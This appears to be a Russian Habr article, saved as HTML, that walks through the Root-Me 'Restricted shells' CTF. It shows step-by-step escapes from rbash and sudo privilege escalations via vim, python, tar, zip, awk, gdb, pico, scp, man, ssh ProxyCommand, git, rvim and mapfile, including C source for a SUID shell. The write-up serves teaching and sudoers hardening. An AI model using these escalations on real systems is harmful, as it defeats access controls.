@@ -1,0 +1,275 @@
+
+Всем доброго времени суток, в этой статье постараюсь описать некоторые способы обхода ограничений на исполнение команд в ОС Linux, советы по использованию которых можно часто встретить на различных форумах. Демонстрация будет проведена на примере задания <a href="https://www.root-me.org/en/Challenges/App-Script/Restricted-shells">Restricted shells</a> с сайта <a href="https://www.root-me.org/">Root-Me</a>. И так, начнём.<a name="habracut"></a><br>
+
+<h3>Пользователь ch14-1</h3><br>
+После подключения по <i>SSH</i> мы попадаем на первого пользователя, и видим подсказку: «Всегда проверять sudo -l». Но для начала нужно обойти первую преграду, это <i>rbash</i>, который часто рекомендуют использовать для ограничения действий пользователя в командной оболочке. И действительно, с виду, он является хорошим решением, но не всегда!<br>
+<br>
+Нас лишили возможности использовать <i>ls</i>, но мы можем отобразить содержимое любой директории используя <i>echo</i>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14@challenge02:~$ <span class="hljs-built_in">echo</span> ./step1/*
+./step1/vim</code></pre><br>
+Обычно, список бинарников разрешённых к запуску в <i>rbash</i> находится в так называемой домашней директории. В данном случае нам доступен <i>vim</i>, используя который мы можем выйти в нормальную оболочку. Запускаем <i>vim</i> и вводим команды:<br>
+<br>
+<pre><code class="bash hljs">
+:<span class="hljs-built_in">set</span> shell=/bin/bash
+:shell</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/a0659764e4e64354a2285ceb3475c9a8.png"><br>
+<br>
+<i>Sudo</i> разрешает нам запустить <i>python</i>, а учитывая его безграничные возможности это не совсем безопасно, и вот почему:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14@challenge02:~$ /usr/bin/sudo -u app-script-ch14-2 /usr/bin/python</code></pre><br>
+Вводим следующие команды:<br>
+<br>
+<pre><code class="python hljs"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os
+<span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">'/bin/bash'</span>)</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/37ce162a551540239bd8dc8bd3adfd59.png"><br>
+<br>
+<h3>Пользователь ch14-2</h3><br>
+И попадаем на следующего пользователя, которому доступен архиватор <i>tar</i>.<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-2@challenge02:~$ /usr/bin/sudo <span class="hljs-_">-l</span>
+    (app-script-ch14-3) NOPASSWD: /bin/tar</code></pre><br>
+Казалось бы, что в этом опасного? Однако <i>tar</i>, как и многие другие архиваторы, позволяет упаковывать и распаковывать файл сохраняя права доступа к нему. Создадим файл <i>shell.c</i> следующего содержания: <br>
+<br>
+<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span>
+</span>{
+	setresgid(getegid(), getegid(), getegid());
+	setresuid(geteuid(), geteuid(), geteuid());
+
+	execve(<span class="hljs-string">"/bin/sh"</span>, argv,  envp);
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre><br>
+Компилируем и добавляем <i>SUID</i> бит:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-2@challenge02:/tmp/lev2$ gcc shell.c -o shell &amp;&amp; chmod 777 shell &amp;&amp; chmod +s shell</code></pre><br>
+Теперь распаковываем с сохранением прав используя <i>sudo</i>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-2@challenge02:/tmp/lev2$ sudo -u app-script-ch14-3 /bin/tar -cf ./test.tar ./shell
+app-script-ch14-2@challenge02:/tmp/lev2$ sudo -u app-script-ch14-3 /bin/tar -xvpf ./test.tar</code></pre><br>
+В результате, после разархивирования, файл <i>shell</i> обретает нового владельца. В этом можно убедиться выполнив <i>ls -ahl</i>:<br>
+<blockquote>-rwsrwsrwx 1 app-script-ch14-3 app-script-ch14 7.2K Feb 14 22:39 shell</blockquote><br>
+После запуска попадаем на следующий уровень:<br>
+<br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/7b8dcc18693e48a8b76587cb438d22a9.png"><br>
+<br>
+<h3>Пользователь ch14-3</h3><br>
+Снова проверяем <i>sudo</i>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-3@challenge02:/tmp/lev2$ sudo <span class="hljs-_">-l</span>
+    (app-script-ch14-4) NOPASSWD: /usr/bin/zip</code></pre><br>
+На этот раз уже лучше, по умолчанию, <i>zip</i> только упаковывает файлы, для распаковки нужен <i>unzip</i>, который мы запустить не можем, или можем?<br>
+<br>
+Заглянув в <i>man</i> по <i>zip</i>'у, находим там интересный параметр:<br>
+<blockquote>-TT <i>cmd</i> --unzip-command cmd<br>
+Use command <i>cmd</i> instead of 'unzip -tqq' to test an archive when the -T option is used. On Unix, to use a copy of unzip in the current directory instead of the standard system unzip, could use:<br>
+<br>
+<pre><code class="bash hljs">zip archive file1 file2 -T -TT <span class="hljs-string">"./unzip -tqq"</span></code></pre><br>
+In <i>cmd</i>, {} is replaced by the name of the temporary archive, otherwise the name of the archive is appended to the end of the command. The return code is checked for success (0 on Unix)</blockquote><br>
+Вот и ответ. Запускаем архивацию с последующим тестированием архива, а в качестве команды для проверки, указываем <i>unzip</i>, который распакует файл в текущую директорию, естественно с сохранением прав доступа:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-3@challenge02:/tmp/lev2$ sudo -u app-script-ch14-4 /usr/bin/zip z shell -TT <span class="hljs-string">'/usr/bin/unzip -K {}'</span> -T
+updating: shell (deflated 67%)
+Archive:  ziFiNi11
+replace shell? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: shell                  
+<span class="hljs-built_in">test</span> of z.zip OK</code></pre><br>
+Проверяем результат:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-3@challenge02:/tmp/lev2$ ls -ahl shell
+-rwsrwsrwx 1 app-script-ch14-4 app-script-ch14 7.2K Feb 15 21:48 shell</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/7add4a5272364719bd77922f0d948da0.png"><br>
+<br>
+<h3>Пользователь ch14-4</h3><br>
+Смотрим, что ему доступно:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-4@challenge02:/tmp/lev2$ sudo <span class="hljs-_">-l</span> | grep NOPASSWD 
+    (app-script-ch14-5) NOPASSWD: /usr/bin/awk</code></pre><br>
+Ну тут всё просто, достаточно выполнить команду, описание которой можно легко найти в сети:<br>
+<br>
+<pre><code class="bash hljs">awk <span class="hljs-string">'BEGIN {system("/bin/bash")}'</span></code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/2532890cb39a421bbdf5b8f8e7f51a3d.png"><br>
+<br>
+<h3>Пользователь ch14-5</h3><br>
+Новый пользователь и новые ограничения:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-5@challenge02:/tmp/lev2$ sudo <span class="hljs-_">-l</span> | grep NOPASSWD 
+    (app-script-ch14-6) NOPASSWD: /usr/bin/gdb</code></pre><br>
+<i>GDB</i> довольно мощный отладчик, и способов вызвать <i>bash</i> у него гораздо больше:<br>
+Первый это через встроенный <i>Python</i>:<br>
+<br>
+<pre><code class="bash hljs">(gdb) python import os; os.system(<span class="hljs-string">'id'</span>)
+uid=1506(app-script-ch14-6) gid=1314(app-script-ch14) groups=1314(app-script-ch14),100(users)
+(gdb) python import os; os.system(<span class="hljs-string">'/bin/bash'</span>)</code></pre><br>
+Либо аналогично, как это делали с <i>vim</i>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-5@challenge02:/tmp/lev2$ sudo -u app-script-ch14-6 /usr/bin/gdb -q -ex <span class="hljs-string">"set shell='/bin/bash'"</span> /bin/ls
+(gdb) shell</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/6ad7793e1fa4431cb0bed60e372019f4.png"><br>
+<br>
+<h3>Пользователь ch14-6</h3><br>
+Если вы думаете: «Что можно сделать через такой простой редактор как pico», то вероятно вы не знаете про его проверку орфографии, о которой кстати написано в <i>man</i>'е. А сказано там следующее, что в качестве утилиты для проверки орфографии, мы можем указать всё что угодно. У нас уже есть отличный бинарник для запуска оболочки, нужно только придать ему соответствующие права. Для этого создадим файл <i>spellbash.sh</i> со следующим содержимым:<br>
+<br>
+<div class="spoiler spoiler_open"><b class="spoiler_title">spellbash.sh</b><div class="spoiler_text" style="display: block;"><pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash</span>
+gcc shell.c -o shell
+chmod 777 shell
+chmod +s shell</code></pre><br>
+</div></div><br>
+Изменяем права:<br>
+<br>
+<pre><code class="bash hljs">chmod 777 spellbash.sh</code></pre><br>
+И запускаем <i>pico</i>, передав ему в качестве программы для проверки орфографии наш скрипт:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-6@challenge02:/tmp/lev2$ sudo -u app-script-ch14-7 /usr/bin/pico <span class="hljs-_">-s</span> ./spellbash.sh</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/602747d2e22e440e8232686d817f777f.png"><br>
+<br>
+После успешной проверки орфографии и закрытия редактора, наш скрипт готов к запуску:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-6@challenge02:/tmp/lev2$ ls -ahl shell
+-rwsrwsrwx 1 app-script-ch14-7 app-script-ch14 7.2K Feb 15 23:02 shell</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/8196539ca20d4c24944d6bf149649e5e.png"><br>
+<br>
+<h3>Пользователь ch14-7</h3><br>
+Ну комментировать все последствия предоставления доступа к копированию файлов по сети не нужно, однако так как доступа в сеть у нас нет, то запустив <i>man</i>, узнаём следующее:<br>
+<blockquote>-S <i>program</i> — Name of program to use for the encrypted connection. The <i>program</i> must understand ssh(1) options.</blockquote><br>
+Ок, действия аналогичны прошлому уровню:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-7@challenge02:/tmp/lev2$ sudo -u app-script-ch14-8 /usr/bin/scp -S ./spellbash.sh 127.0.0.1:/tmp/z.zip ./
+app-script-ch14-7@challenge02:/tmp/lev2$ ls -ahl shell
+-rwsrwsrwx 1 app-script-ch14-8 app-script-ch14 7.2K Feb 15 23:09 shell</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/a8cfdb2281494c9d99545a638f56fc09.png"><br>
+<br>
+<h3>Пользователь ch14-8</h3><br>
+А вот это уже интересно. Однако и тут есть подводные камни. Так например, если запустить <i>man</i>, и в интерактивном режиме нажать "<i>h</i>", будет показана справка, в которой можно обнаружить вот такую запись:<br>
+<blockquote> !command Execute the shell command with $SHELL.</blockquote><br>
+Прямое исполнение команд оболочки. То что нам нужно, открываем <i>man</i> для любой команды, и вводим <i>!/bin/bash</i>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-8@challenge02:/tmp/lev2$ sudo -u app-script-ch14-9 /usr/bin/man ls</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/cac0a432f5b441f9894aa7ef3beb62bd.png"><br>
+<br>
+<h3>Пользователь ch14-9</h3><br>
+Так как прав выполнить подключение к внешнему серверу у нас нет, то нужен способ выполнить команду, ещё до установки соединения. И такая возможность есть, воспользуемся советом, описанным <a href="http://unix.stackexchange.com/questions/44307/can-ssh-configs-proxycommand-run-a-local-command-before-connecting-to-a-remote">тут</a>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-9@challenge02:/tmp/lev2$ sudo -u app-script-ch14-10 /usr/bin/ssh -o ProxyCommand=<span class="hljs-string">"sh -c './spellbash.sh'"</span> 127.0.0.1</code></pre><br>
+Получаем сообщение о том, что соединение сброшено, но это нем и не важно, ведь:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-9@challenge02:/tmp/lev2$ ls -ahl shell 
+-rwsrwsrwx 1 app-script-ch14-10 app-script-ch14 7.2K Feb 18 21:34 shell</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/2063d803a1654bb68ac6886b1ed89abd.png"><br>
+<br>
+<h3>Пользователь ch14-10</h3><br>
+<i>Git</i> так же предоставляет множество способов выполнить стороннюю команду, мы воспользуемся наиболее простым из них, который мы использовали с <i>man</i>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-10@challenge02:/tmp/lev2$ sudo -u app-script-ch14-11 /usr/bin/git <span class="hljs-built_in">help</span> status</code></pre><br>
+Далее вводим <i>!/bin/bash</i> и попадаем на следующего пользователя:<br>
+<br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/71706ea5d0724dbea1a331d56ffa2eed.png"><br>
+<br>
+<h3>Пользователь ch14-11</h3><br>
+Вот мы и дошли до ещё одного распространённого совета, вместо <i>vim</i> использовать его ограниченную версию <i>rvim</i> и вот почему: Попробовав тот же способ, что использовался в самом начале для <i>vim</i>, получаем ошибку:<br>
+<br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/37919cb853a8482795c2985427267449.png"><br>
+<br>
+Но и тут есть лазейки… Просматривая список доступных команд, можно наткнуться на команды <i>:python</i> и <i>:lua</i>. Ограниченный от прямого исполнения команд <i>rvim</i> оказался не таким уж и безопасным.<br>
+<br>
+<pre><code class="bash hljs">:python import os; os.system(<span class="hljs-string">'gcc shell.c -o shell &amp;&amp; chmod 777 shell &amp;&amp; chmod +s shell'</span>)</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/41afcc5fdbd74582966a8236c86baac6.png"><br>
+<br>
+<h3>Пользователь ch14-12</h3><br>
+<i>script</i> запускает новую сессию, и полностью логирует всё в указанный файл, так что просто запускаем: <br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-12@challenge02:/tmp/lev2$ sudo -u app-script-ch14-13 /usr/bin/script script.sh</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/3bc1d12ba95044199125d0e5eef48dd6.png"><br>
+<br>
+<h3>Пользователь ch14-13</h3><br>
+Тут тоже ничего сложного, поэтому просто запускаем и снова попадаем в «начало»:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-13@challenge02:/tmp/lev2$ sudo -u app-script-ch14-14 /bin/rbash --</code></pre><br>
+<img src="./Не доверяйте SUDO, она может вас подвести _ Хабрахабр_files/782244c183e2451fa7afaf954eb9b279.png"><br>
+<br>
+<h3>Пользователь ch14-14</h3><br>
+На этот раз авторы учли ошибки, и убрали <i>vim</i>:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-14@challenge02:~/step14$ <span class="hljs-built_in">echo</span> ./*
+./sl</code></pre><br>
+При выполнении команды, как можно догадаться появляется анимация локомотива и надпись <blockquote>THE GAME IS OVER!</blockquote><br>
+Но содержимое файла .passwd, требуемое по условию задания, мы так и не получили. Значит это ещё не конец.<br>
+<br>
+Посмотрим список команд, которые доступны:<br>
+<br>
+<div class="spoiler"><b class="spoiler_title">[TAB] [TAB]</b><div class="spoiler_text"><pre><code class="bash hljs">!                         <span class="hljs-keyword">elif</span>                      <span class="hljs-built_in">pushd</span>
+./                        <span class="hljs-keyword">else</span>                      <span class="hljs-built_in">pwd</span>
+:                         <span class="hljs-built_in">enable</span>                    <span class="hljs-built_in">readonly</span>
+[                         <span class="hljs-keyword">esac</span>                      <span class="hljs-built_in">return</span>
+[[                        <span class="hljs-built_in">eval</span>                      select
+]]                        <span class="hljs-built_in">exit</span>                      <span class="hljs-built_in">set</span>
+<span class="hljs-built_in">alias</span>                     <span class="hljs-built_in">export</span>                    <span class="hljs-built_in">shift</span>
+<span class="hljs-built_in">bg</span>                        <span class="hljs-literal">false</span>                     <span class="hljs-built_in">shopt</span>
+<span class="hljs-built_in">bind</span>                      <span class="hljs-built_in">fc</span>                        sl
+<span class="hljs-built_in">break</span>                     <span class="hljs-built_in">fg</span>                        <span class="hljs-built_in">suspend</span>
+<span class="hljs-built_in">builtin</span>                   <span class="hljs-keyword">fi</span>                        <span class="hljs-built_in">test</span>
+<span class="hljs-built_in">caller</span>                    <span class="hljs-keyword">for</span>                       <span class="hljs-keyword">then</span>
+<span class="hljs-keyword">case</span>                      <span class="hljs-keyword">function</span>                  time
+<span class="hljs-built_in">cd</span>                        <span class="hljs-built_in">getopts</span>                   <span class="hljs-built_in">times</span>
+<span class="hljs-built_in">command</span>                   <span class="hljs-built_in">hash</span>                      <span class="hljs-built_in">trap</span>
+<span class="hljs-built_in">command</span>_not_found_handle  <span class="hljs-built_in">help</span>                      <span class="hljs-literal">true</span>
+compgen                   <span class="hljs-built_in">history</span>                   <span class="hljs-built_in">type</span>
+complete                  <span class="hljs-keyword">if</span>                        <span class="hljs-built_in">typeset</span>
+compopt                   <span class="hljs-keyword">in</span>                        <span class="hljs-built_in">ulimit</span>
+<span class="hljs-built_in">continue</span>                  <span class="hljs-built_in">jobs</span>                      <span class="hljs-built_in">umask</span>
+coproc                    <span class="hljs-built_in">kill</span>                      <span class="hljs-built_in">unalias</span>
+<span class="hljs-built_in">declare</span>                   <span class="hljs-built_in">let</span>                       <span class="hljs-built_in">unset</span>
+<span class="hljs-built_in">dirs</span>                      <span class="hljs-built_in">local</span>                     until
+<span class="hljs-built_in">disown</span>                    <span class="hljs-built_in">logout</span>                    <span class="hljs-built_in">wait</span>
+<span class="hljs-keyword">do</span>                        <span class="hljs-built_in">mapfile</span>                   <span class="hljs-keyword">while</span>
+<span class="hljs-keyword">done</span>                      <span class="hljs-built_in">popd</span>                      {
+<span class="hljs-built_in">echo</span>                      <span class="hljs-built_in">printf</span>                    }
+</code></pre><br>
+</div></div><br>
+Не густо, однако есть несколько способов получить содержимое файла <i>.passwd</i>, здесь будет только 1 из них, остальные оставлю вам на самостоятельный поиск. И так, просматривая <i>help</i> по каждой доступной команде, находим одну из них довольно интересной:<br>
+<br>
+<div class="spoiler"><b class="spoiler_title">help mapfile</b><div class="spoiler_text"><pre><code class="bash hljs"><span class="hljs-built_in">mapfile</span>: <span class="hljs-built_in">mapfile</span> [-n count] [-O origin] [<span class="hljs-_">-s</span> count] [-t] [-u fd] [-C callback] [-c quantum] [array]
+    Read lines from the standard input into an indexed array variable.
+    
+    Read lines from the standard input into the indexed array variable ARRAY, or
+    from file descriptor FD <span class="hljs-keyword">if</span> the -u option is supplied.  The variable MAPFILE
+    is the default ARRAY.
+    
+    Options:
+      -n count	Copy at most COUNT lines.  If COUNT is 0, all lines are copied.
+      -O origin	Begin assigning to ARRAY at index ORIGIN.  The default index is 0.
+      <span class="hljs-_">-s</span> count 	Discard the first COUNT lines read.
+      -t		Remove a trailing newline from each line read.
+      -u fd		Read lines from file descriptor FD instead of the standard input.
+      -C callback	Evaluate CALLBACK each time QUANTUM lines are read.
+      -c quantum	Specify the number of lines <span class="hljs-built_in">read</span> between each call to CALLBACK.
+    
+    Arguments:
+      ARRAY		Array variable name to use <span class="hljs-keyword">for</span> file data.
+    
+    If -C is supplied without -c, the default quantum is 5000.  When
+    CALLBACK is evaluated, it is supplied the index of the next array
+    element to be assigned and the line to be assigned to that element
+    as additional arguments.
+    
+    If not supplied with an explicit origin, <span class="hljs-built_in">mapfile</span> will clear ARRAY before
+    assigning to it.
+    
+    Exit Status:
+    Returns success unless an invalid option is given or ARRAY is <span class="hljs-built_in">readonly</span> or
+    not an indexed array.
+</code></pre><br>
+</div></div><br>
+После недолгих поисков в сети примеров её использования, находим <a href="https://peniwize.wordpress.com/2011/04/09/how-to-read-all-lines-of-a-file-into-a-bash-array/">статью</a>, которая как раз описывает способ чтения произвольного файла в переменную окружения, используя эту команду. <br>
+<br>
+Воспользовавшись советом, выполняем:<br>
+<br>
+<pre><code class="bash hljs">app-script-ch14-14@challenge02:~/step14$ <span class="hljs-built_in">mapfile</span> ARRAY &lt; ../.passwd ARRAY
+app-script-ch14-14@challenge02:~/step14$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$ARRAY</span></code></pre><br>
+И получаем искомый пароль.<br>
+<br>
+Теперь, добавляя возможность запуска какой-либо программы в файл <i>sudoers</i>, не поленитесь и ознакомьтесь с полным её описанием, ведь возможно именно она станет основной дырой в безопасности.<br>
+<br>
+P.S. На самом деле для каждого из уровней есть своё определённое множество решений, и найти свой собственный путь будет гораздо интереснее
